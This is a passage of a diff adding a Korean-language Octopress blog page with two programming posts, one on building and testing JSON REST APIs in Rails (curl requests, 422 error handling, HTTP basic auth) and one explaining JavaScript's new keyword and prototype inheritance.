+<li><a href="http://engineering.gomiso.com/2011/05/16/if-youre-using-to_json-youre-doing-it-wrong">If you&rsquo;re using to_json, you&rsquo;re doing it wrong way</a></li>
+<li><a href="http://railscasts.com/episodes/322-rabl">RailsCasts #322 RABL</a></li>
+<li><a href="http://travisjeffery.com/b/2012/04/rendering-errors-in-json-with-rails">Rendering errors in json with rails</a></li>
+<li><a href="http://railscasts.com/episodes/350-rest-api/versioning">RailsCasts #350 REST API Versioning</a></li>
+</ul>
+
+
+<p>을 번역 정리 해본다.</p>
+
+<h3>Curl 로 JSON 서버를 Test 할 경우</h3>
+
+<p><code>curl -v -H "Accept: application/json" -H "Content-type: application/json" -X POST -d '[{"exam_id":1,"user":"GILDONG", "answer":1,"used_time":5.2 }]' http://localhost:3000/results</code></p>
+
+<ul>
+<li><code>-v</code> 로 verbose 세팅</li>
+<li><code>-X POST</code> 로 HTTP METHOD 를 <em>POST</em> 로 세팅</li>
+<li>그리고 <em>Accept:</em> 와 <em>Content-type:</em> 헤더를 <em>application/json</em> 으로 세팅</li>
+</ul>
+
+
+<h3>Handling Errors</h3>
+
+<p>RESTful JSON 을 Rails 로 구현할때 HTTP Status Code 를 깜빡하기 쉽다.</p>
+
+<pre><code>def create
+  @model = Model.create(params[:model])
+  if @model.save
+    render :json =&gt; @model
+  else
+    render :json =&gt; { :errors =&gt; @model.errors.full_messages }, :status =&gt; 422
+  end
+end
+</code></pre>
+
+<p>Error 시에 적절하게 HTTP Status Code 를 세팅하는 것. 예를 들어 <em>422 unprocessable entity</em> 로 세팅한다거나.</p>
+
+<p>full_messages 대신에 errors 오브젝트를 사용할수도 있어.</p>
+
+<pre><code>render :json =&gt; { :errors =&gt; @model.errors }
+</code></pre>
+
+<h3>Versioning REST API</h3>
+
+<h3>Securing API &amp; OAuth</h3>
+
+<h4>id:password 방식</h4>
+
+<p><a href="http://railscasts.com/episodes/352-securing-an-api?autoplay=true">Railscasts ep352: Securing an API</a> 를 보면</p>
+
+<p>기본적으로는 Rails controller 에</p>
+
+<pre><code>http_basic_authentication_with name: "dhh", password: "secret"
+</code></pre>
+
+<p>으로 하면 <code>curl http://localhost:3000/api/products</code> 로 하면 <code>401 Unauthorized</code>
+되고,
+<code>curl http://localhost:3000/api/products -u 'admin:secret'</code> 처럼 id:password 를 주면 된다.</p>
+
+<ul>
+<li><a href="http://www.thebuzzmedia.com/designing-a-secure-rest-api-without-oauth-authentication/">Designing a Secure REST API without OAuth</a></li>
+<li>Web API Design: Crafting Interfaces that Developers Love</li>
+<li><a href="https://github.com/ltbl/api.gae9.com">gae9 API</a></li>
+</ul>
+
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2012/10/14/what-is-the-new-keyword-in-javascript/">What Is the 'New' Keyword in JavaScript?</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2012-10-14T20:45:00+09:00'><span class='date'><span class='date-month'>Oct</span> <span class='date-day'>14</span><span class='date-suffix'>th</span>, <span class='date-year'>2012</span></span> <span class='time'>8:45 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>스택오버플로우에서 좋은 질문을 찾았다.</p>
+
+<ul>
+<li><a href="http://stackoverflow.com/questions/1646698/what-is-the-new-keyword-in-javascript">What is the &lsquo;new&rsquo; keyword in JavaScript?</a></li>
+<li><a href="http://stackoverflow.com/questions/383201/relation-between-prototype-and-prototype-in-javascript">Relation between [[Prototype]] and prototype in JavaScript
+</a></li>
+</ul>
+
+
+<p>간단히 번역 &amp; 정리해본다.</p>
+
+<h3>JavaScript 의 상속</h3>
+
+<p>&ldquo;constructor 함수 가지고 만들어진 Object 는, constructor 함수의 <em>prototype</em> 프라퍼티가 가리키는 Object 로부터 상속받는다.&rdquo;</p>
+
+<h3>JavaScript 의 new 가 하는 일</h3>
+
+<p>JavaScript 의 new 가 하는 일은 3 가지이다.</p>
+
+<ol>
+<li>새로운 object 를 생성한다. 생성된 object 의 type 은 심플하게 그냥 <em>object</em> 이다.</li>
+<li>생성된 object 의 접근불가한 <em>[[Prototype]]</em> 프라퍼티를 constructor 함수의 접근가능한 외부용 <em>prototype</em> 이 가리키는 오브젝트로 세팅한다.</li>
+<li>constructor 함수를 실행한다. (함수에서 <code>this</code> 가 나오면 새로 생성된 오브젝트를 사용)</li>
+</ol>
+
+
+<p>예제를 가지고 알아보자.</p>
+
+<pre><code> js&gt; function C() { this.a = "babo" }
+ js&gt; C.prototype = { b: "babo2" }
+ ({b:"babo2"})
+ js&gt; obj = new C()
+ ({a:"babo"})
+ js&gt; obj.a
+ "babo"
+ js&gt; obj.b
+ "babo2"
+ js&gt; obj.c
+ js&gt; C.prototype.c = "babo3"
+ "babo3"
+ js&gt; obj.c
+ "babo3"
+ js&gt;
+</code></pre>
+
+<p>간단한 constructor 함수를 정의한다.
+그리고 이 constructor 함수의 <em>prototype</em> 을 간단히 <code>{ b: "babo2" }</code> object 로 세팅한다.</p>
+
+<p><code>new C()</code> 하는 순간</p>
+
+<ol>
+<li>새로운 object 가 생성되고. <em>obj</em> 라고 칭하면.</li>
+<li><code>obj.[[Prototype]] = C.prototype</code> 이 실행되고.</li>
+<li><code>{ obj.a = 'babo' }</code> 가 실행된다.</li>
+</ol>
+
+
+<p>풀어서 따라가보면</p>
+
+<ol>
+<li><code>obj.[[Prototype]]</code> 은 <code>{ b: "babo2" }</code> object 를 가리키고,
+constructor 가 수행되면서 <code>obj.a</code> 가 <code>"babo"</code> 로 세팅되었다.</li>
+<li>그래서 <code>obj.a</code> 와 <code>obj.b</code> 가 각각 <code>"babo"</code>, <code>"babo2"</code> 로 evaluated 된다.</li>
+<li>그 다음에 <code>C.prototype.c = "babo3"</code> 로 <code>{ b: "babo2" }</code> 에 <code>c</code>를 추가한다.</li>
+<li>그러면 <code>obj.[[Prototype]]</code> 은 이제 <code>{ b: "babo2", c: "babo3" }</code> object 를 가리키게 된다.</li>
+<li>그래서 <code>obj.c</code> 가 &ldquo;babo3&rdquo; 로 evaluated 된다.</li>
+</ol>
+
+
+<p>정리하면</p>
+
+<ul>
+<li>function 만이 <em>prototype</em> 프라퍼티를 갖는다.</li>
+<li>모든 object 는 숨겨진 <em>[[Prototype]]</em> 프라퍼티를 갖는다.</li>
+<li>Browser implementation 에 따라 <em>[[Prototype]]</em> 이 <em><strong>proto</strong></em> 인 경우도 있다.</li>
+<li>function 도 <em>[[Prototype]]</em> 프라퍼티를 갖는다. (&ldquo;Functions are first-class objects in JavaScript.&rdquo;)</li>
+<li>따라서 function 만 <em>[[Prototype]]</em> 과 <em>prototype</em> 을 모두 가진다.</li>
+<li>그외의 object 는 <em>[[Prototype]]</em> 만 가진다.</li>
+<li>object 의 <em>[[Prototype]]</em> 은 new 키워드를 통해서만 세팅 가능하다. (브라우저 임플리멘테이션에 따라서 다를 수 있지만)</li>
+</ul>
+
+
+<h3>Crockford 책에 나오는 beget()</h3>
+
+<p>이제, Douglas Crockford 책에 나오는 beget() 를 보도록 하자.</p>
+
+<pre><code> if (typeof Object.beget !== 'function') {
+   Object.beget = function (o) {
+     var F = function () {};
+     F.prototype = o;
+     return new F();
+   };
+ }
+ var another_stooge = Object.beget(stooge);
+</code></pre>
+
+<p>상속을 위한 Constructor 함수를 대신 만들어서 오브젝트를 생성해준다.</p>
+
+<h3>Eloquent JavaScript 에 나오는 예제</h3>
+
+<h3>Further reading:</h3>
+
+<ul>
+<li><a href="http://prototypejs.org/learn/class-inheritance">Prototype.js 의 class 와 상속에 관한 아티클</a></li>
+</ul>
+
+</div>
+  
+  
+
+
+    </article>
+  
+  <div class="pagination">
+    
+      <a class="prev" href="/posts/20">&larr; Older</a>
+    
+    <a href="/blog/archives">Blog Archives</a>
+    
+    <a class="next" href="/posts/18">Newer &rarr;</a>
+    
+  </div>
+</div>
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2015/10/04/return-oriented-programming-for-the-arm-architecture/">Return Oriented Programming for the ARM Architecture</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/10/02/the-inside-story-behind-ms08-067/">The Inside Story Behind MS08-067</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/09/17/rop-and-arm/">ROP and ARM</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/09/13/sophail-applied-attacks-against-sophos-antivirus/">Sophail: Applied Attacks Against Sophos Antivirus</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/09/13/stagefright/">Stagefright</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2015 - Your Name -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
